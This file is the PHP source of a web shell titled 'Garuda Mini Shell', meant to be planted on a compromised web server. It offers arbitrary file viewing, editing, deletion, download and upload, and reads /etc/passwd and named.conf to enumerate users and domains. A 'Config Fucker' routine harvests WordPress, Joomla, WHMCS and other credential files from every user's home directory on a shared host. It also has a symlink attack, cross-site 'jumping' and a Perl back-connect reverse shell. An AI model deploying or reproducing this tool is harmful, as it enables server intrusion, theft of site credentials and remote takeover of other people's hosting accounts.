		print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
		print "</tr>";
	}

	print "</table>";
}
function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

function getdomainname() {
	$fopen = fopen("/etc/named.conf", "r");
	while($read = fgets($fopen)) {
		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
		$domain[] = $getdomain[1][0];
	}
	return $domain;
}
function footer(){
	echo source("author");
}
function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}
function act(){
if($_GET['act'] === 'newfile') {
			if($_POST['save']) {
				$filename = htmlspecialchars($_POST['filename']);
				$fopen    = fopen($filename, "a+");
				if($fopen) {
					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			}
			print $act;
			print "<form method='post'>
			Filename: <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'newfolder') {
			if($_POST['save']) {
				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
				if(!@mkdir($foldername)) {
					$act = color(1, 1, "Permission Denied!");
				} 
				else {
					$act = "<script>window.location='?dir=".path()."';</script>";
				}
			}
			print $act;
			print "<form method='post'>
			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename_folder') {
			if($_POST['save']) {
				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
				if($rename_folder) {
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			print "$act<br>";
			}
			print "<form method='post'>
			<input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		} 
		elseif($_GET['act'] === 'delete_folder') {
			if(is_dir(path())) {
				if(is_writable(path())) {
					@rmdir(path());
					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
				}
			}
			print $act;
		} 
		elseif($_GET['act'] === 'view') {
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
		} 
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				$save = file_put_contents($_GET['file'], $_POST['src']);
				if($save) {
					$act = color(1, 2, "File Saved!");
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename') {
			if($_POST['save']) {
				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
				if($rename) {
					$act = "<script>window.location='?dir=".path()."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		}
		elseif($_GET['act'] === 'delete') {
			$delete = unlink($_GET['file']);
			if($delete) {
				$act = "<script>window.location='?dir=".path()."';</script>";
			} 
			else {
				$act = color(1, 1, "Permission Denied!");
			}
			print $act;
		}
		elseif ($_GET['act'] == 'symlinker') {
			if(OS()=="Windows"){
			exit(color(1,1,"Not Support Windows Server!"));
			}
			if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'sym'."));	
			if(!is_dir(path()."/sym/")) {
			save("/tmp/symlink.pl", "w", source("symlinker"));
			exe("perl /tmp/symlink.pl");
			sleep(1);
			@unlink("/tmp/symlink.pl");
			@unlink("passwd.txt");
			@unlink("sym/pas.txt");
			@unlink("sym/nemu.txt");	
			}
			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/sym/' frameborder='0' scrolling='yes'></iframe>";
			print "</div>";
		} elseif ($_GET['act'] == 'symconfig') {
			if(OS()=="Windows"){
				exit(color(1,1,"Not Support Windows Server!"));
			}
			if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'config_fucker'."));
			if(!is_dir(path()."/config_fucker/")) {
			@mkdir('config_fucker', 0755);
			$htaccess = "Options all\nDirectoryIndex index.htm\nSatisfy Any";
			save("config_fucker/.htaccess","w", $htaccess);
			foreach(getuser() as $user) {
				$user_docroot = "/home/$user/public_html/";
				if(is_readable($user_docroot)) {
					$getconfig = array(
						"/home/$user/.accesshash" => "WHM-accesshash",
						"$user_docroot/config/koneksi.php" => "Lokomedia",
						"$user_docroot/forum/config.php" => "phpBB",
						"$user_docroot/sites/default/settings.php" => "Drupal",
						"$user_docroot/config/settings.inc.php" => "PrestaShop",
						"$user_docroot/app/etc/local.xml" => "Magento",
						"$user_docroot/admin/config.php" => "OpenCart",
						"$user_docroot/application/config/database.php" => "Ellislab",
						"$user_docroot/vb/includes/config.php" => "Vbulletin",
						"$user_docroot/includes/config.php" => "Vbulletin",
						"$user_docroot/forum/includes/config.php" => "Vbulletin",
						"$user_docroot/forums/includes/config.php" => "Vbulletin",
						"$user_docroot/cc/includes/config.php" => "Vbulletin",
						"$user_docroot/inc/config.php" => "MyBB",
						"$user_docroot/includes/configure.php" => "OsCommerce",
						"$user_docroot/shop/includes/configure.php" => "OsCommerce",
						"$user_docroot/os/includes/configure.php" => "OsCommerce",
						"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
						"$user_docroot/products/includes/configure.php" => "OsCommerce",
						"$user_docroot/cart/includes/configure.php" => "OsCommerce",
						"$user_docroot/inc/conf_global.php" => "IPB",
						"$user_docroot/wp-config.php" => "Wordpress",
						"$user_docroot/wp/test/wp-config.php" => "Wordpress",
						"$user_docroot/blog/wp-config.php" => "Wordpress",
						"$user_docroot/beta/wp-config.php" => "Wordpress",
						"$user_docroot/portal/wp-config.php" => "Wordpress",
						"$user_docroot/site/wp-config.php" => "Wordpress",
						"$user_docroot/wp/wp-config.php" => "Wordpress",
						"$user_docroot/WP/wp-config.php" => "Wordpress",
						"$user_docroot/news/wp-config.php" => "Wordpress",
						"$user_docroot/wordpress/wp-config.php" => "Wordpress",
						"$user_docroot/test/wp-config.php" => "Wordpress",
						"$user_docroot/demo/wp-config.php" => "Wordpress",
						"$user_docroot/home/wp-config.php" => "Wordpress",
						"$user_docroot/v1/wp-config.php" => "Wordpress",
						"$user_docroot/v2/wp-config.php" => "Wordpress",
						"$user_docroot/press/wp-config.php" => "Wordpress",
						"$user_docroot/new/wp-config.php" => "Wordpress",
						"$user_docroot/blogs/wp-config.php" => "Wordpress",
						"$user_docroot/configuration.php" => "Joomla",
						"$user_docroot/blog/configuration.php" => "Joomla",
						"$user_docroot/submitticket.php" => "^WHMCS",
						"$user_docroot/cms/configuration.php" => "Joomla",
						"$user_docroot/beta/configuration.php" => "Joomla",
						"$user_docroot/portal/configuration.php" => "Joomla",
						"$user_docroot/site/configuration.php" => "Joomla",
						"$user_docroot/main/configuration.php" => "Joomla",
						"$user_docroot/home/configuration.php" => "Joomla",
						"$user_docroot/demo/configuration.php" => "Joomla",
						"$user_docroot/test/configuration.php" => "Joomla",
						"$user_docroot/v1/configuration.php" => "Joomla",
						"$user_docroot/v2/configuration.php" => "Joomla",
						"$user_docroot/joomla/configuration.php" => "Joomla",
						"$user_docroot/new/configuration.php" => "Joomla",
						"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
						"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/WHMC/submitticket.php" => "WHMCS",
						"$user_docroot/Whmc/submitticket.php" => "WHMCS",
						"$user_docroot/whmc/submitticket.php" => "WHMCS",
						"$user_docroot/WHM/submitticket.php" => "WHMCS",
						"$user_docroot/Whm/submitticket.php" => "WHMCS",
						"$user_docroot/whm/submitticket.php" => "WHMCS",
						"$user_docroot/HOST/submitticket.php" => "WHMCS",
						"$user_docroot/Host/submitticket.php" => "WHMCS",
						"$user_docroot/host/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
						"$user_docroot/Supportes/submitticket.php" => "WHMCS",
						"$user_docroot/supportes/submitticket.php" => "WHMCS",
						"$user_docroot/domains/submitticket.php" => "WHMCS",
						"$user_docroot/domain/submitticket.php" => "WHMCS",
						"$user_docroot/Hosting/submitticket.php" => "WHMCS",
						"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
						"$user_docroot/hosting/submitticket.php" => "WHMCS",
						"$user_docroot/CART/submitticket.php" => "WHMCS",
						"$user_docroot/Cart/submitticket.php" => "WHMCS",
						"$user_docroot/cart/submitticket.php" => "WHMCS",
						"$user_docroot/ORDER/submitticket.php" => "WHMCS",
						"$user_docroot/Order/submitticket.php" => "WHMCS",
						"$user_docroot/order/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
						"$user_docroot/Client/submitticket.php" => "WHMCS",
						"$user_docroot/client/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
						"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/Support/submitticket.php" => "WHMCS",
						"$user_docroot/support/submitticket.php" => "WHMCS",
						"$user_docroot/BILLING/submitticket.php" => "WHMCS",
						"$user_docroot/Billing/submitticket.php" => "WHMCS",
						"$user_docroot/billing/submitticket.php" => "WHMCS",
						"$user_docroot/BUY/submitticket.php" => "WHMCS",
						"$user_docroot/Buy/submitticket.php" => "WHMCS",
						"$user_docroot/buy/submitticket.php" => "WHMCS",
						"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
						"$user_docroot/Manage/submitticket.php" => "WHMCS",
						"$user_docroot/manage/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
						"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
						"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
						"$user_docroot/Checkout/submitticket.php" => "WHMCS",
						"$user_docroot/checkout/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/BASKET/submitticket.php" => "WHMCS",
						"$user_docroot/Basket/submitticket.php" => "WHMCS",
						"$user_docroot/basket/submitticket.php" => "WHMCS",
						"$user_docroot/SECURE/submitticket.php" => "WHMCS",
						"$user_docroot/Secure/submitticket.php" => "WHMCS",
						"$user_docroot/secure/submitticket.php" => "WHMCS",
						"$user_docroot/SALES/submitticket.php" => "WHMCS",
						"$user_docroot/Sales/submitticket.php" => "WHMCS",
						"$user_docroot/sales/submitticket.php" => "WHMCS",
						"$user_docroot/BILL/submitticket.php" => "WHMCS",
						"$user_docroot/Bill/submitticket.php" => "WHMCS",
						"$user_docroot/bill/submitticket.php" => "WHMCS",
						"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
						"$user_docroot/Purchase/submitticket.php" => "WHMCS",
						"$user_docroot/purchase/submitticket.php" => "WHMCS",
						"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
						"$user_docroot/Account/submitticket.php" => "WHMCS",
						"$user_docroot/account/submitticket.php" => "WHMCS",
						"$user_docroot/USER/submitticket.php" => "WHMCS",
						"$user_docroot/User/submitticket.php" => "WHMCS",
						"$user_docroot/user/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
						"$user_docroot/Clients/submitticket.php" => "WHMCS",
						"$user_docroot/clients/submitticket.php" => "WHMCS",
						"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
						"$user_docroot/Billings/submitticket.php" => "WHMCS",
						"$user_docroot/billings/submitticket.php" => "WHMCS",
						"$user_docroot/MY/submitticket.php" => "WHMCS",
						"$user_docroot/My/submitticket.php" => "WHMCS",
						"$user_docroot/my/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
						"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/panel/submitticket.php" => "WHMCS",
						"$user_docroot/clientes/submitticket.php" => "WHMCS",
						"$user_docroot/cliente/submitticket.php" => "WHMCS",
						"$user_docroot/support/order/submitticket.php" => "WHMCS",
						"$user_docroot/bb-config.php" => "BoxBilling",
						"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
						"$user_docroot/box/bb-config.php" => "BoxBilling",
						"$user_docroot/host/bb-config.php" => "BoxBilling",
						"$user_docroot/Host/bb-config.php" => "BoxBilling",
						"$user_docroot/supportes/bb-config.php" => "BoxBilling",
						"$user_docroot/support/bb-config.php" => "BoxBilling",
						"$user_docroot/hosting/bb-config.php" => "BoxBilling",
						"$user_docroot/cart/bb-config.php" => "BoxBilling",
						"$user_docroot/order/bb-config.php" => "BoxBilling",
						"$user_docroot/client/bb-config.php" => "BoxBilling",
						"$user_docroot/clients/bb-config.php" => "BoxBilling",
						"$user_docroot/cliente/bb-config.php" => "BoxBilling",
						"$user_docroot/clientes/bb-config.php" => "BoxBilling",
						"$user_docroot/billing/bb-config.php" => "BoxBilling",
						"$user_docroot/billings/bb-config.php" => "BoxBilling",
						"$user_docroot/my/bb-config.php" => "BoxBilling",
						"$user_docroot/secure/bb-config.php" => "BoxBilling",
						"$user_docroot/support/order/bb-config.php" => "BoxBilling",
						"$user_docroot/includes/dist-configure.php" => "Zencart",
						"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/products/includes/dist-configure.php" => "Zencart",
						"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
						"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
						"$user_docroot/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
						"$user_docroot/host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
						"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/includes/iso4217.php" => "Hostbills",
						"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
						"$user_docroot/order/includes/iso4217.php" => "Hostbills",
						"$user_docroot/client/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
						"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
						"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
						"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
						"$user_docroot/my/includes/iso4217.php" => "Hostbills",
						"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
						"$user_docroot/support/order/includes/iso4217.php" => "Hostbills"

					);
					foreach($getconfig as $config => $userconfig) {
						$get = file_get_contents($config);
						if($get == '') {
						}
						else {
							$fopen = fopen("config_fucker/$user~$userconfig.txt", "w");
							fputs($fopen, $get);
						}
					}
				}
			}
		}
		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'><iframe>";
		print "</div>";
		} elseif ($_GET['act'] == "jumping") {
		if(OS()=="Windows"){
		exit(color(1,1,"Not Support Windows Server!"));
		}			
		$i = 0;
		foreach(getuser() as $user) {
			$path = "/home/$user/public_html";
			if(is_readable($path)) {
				$status = color(1, 2, "[R]");
				if(is_writable($path)) {
					$status = color(1, 2, "[RW]");
				}
				$i++;
				print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
				if(!function_exists('posix_getpwuid')) print "<br>";
				if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
				foreach(getdomainname() as $domain) {
					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
					$userdomain = $userdomain->name;
					if($userdomain === $user) {
						print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
						break;
					}
				}
			}
		}
		print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i website di ".$GLOBALS['SERVERIP'])."</p>";
	} elseif ($_GET['act'] == 'perlback') {
		if(OS()=="Windows"){
		exit(color(1,1,"Not Support Windows Server!"));
		}	
				save("/tmp/bc.pl", "w", source("perlback"));
				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
				@unlink("/tmp/bc.pl");
	} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

}

/*
	Start SHell
*/
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="author" content="<?=source("author");?>">
	<title>Garuda Mini Shell</title>
	<style type="text/css">
	<?=source("css");?>
	</style>
</head>
<body>
<div class="menus">
	<a href="?" class="dem">Home</a>
	<a href="?act=symlinker&dir=<?=path();?>" class="dem">Symlink 404</a>
	<a href="?act=symconfig&dir=<?=path();?>" class="dem">Config Fucker</a>
	<a href="?act=jumping&dir=<?=path();?>" class="dem">Jumping</a>
	<a href="?act=perlback&dir=<?=path();?>" class="dem">Perl Back Connect</a>
	<br>
</div>
<br><br>	
<div class="main-header">
	<strong><a href="?">Garuda Mini Shell</a></strong>
</div>
<?php
if($_POST['upload']) {
			if($_POST['uploadtype'] === '1') {
				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			} 
			elseif($_POST['uploadtype'] === '2') {
				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
					if(@copy($_FILES['file']['tmp_name'], $root)) {
						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
					} 
					else {
						$act = color(1, 1, "Failed to upload file!");
					}
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			}
		}
		print "<center>Upload File: $act
			  <form method='post' enctype='multipart/form-data'>
			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
			  <input type='file' name='file'>
			  <input type='submit' value='upload' name='upload'>
			  </form></center>"; 
if(isset($_GET['act'])) {
	?>
<div class="main">
	<?php act(); ?>
</div>
<?php } else {
?>	
<div class="filemanager-box">
<?php
files_and_folder();
?>
</div>
<?php } ?>
<div style="margin: 6px;border-bottom: 3px solid transparent;text-align: center;">
Code By <?=footer();?> - Thanks To IndoXploit - Garuda Security Hacker 
</div>
</body>
</html>
<?php 
// Silent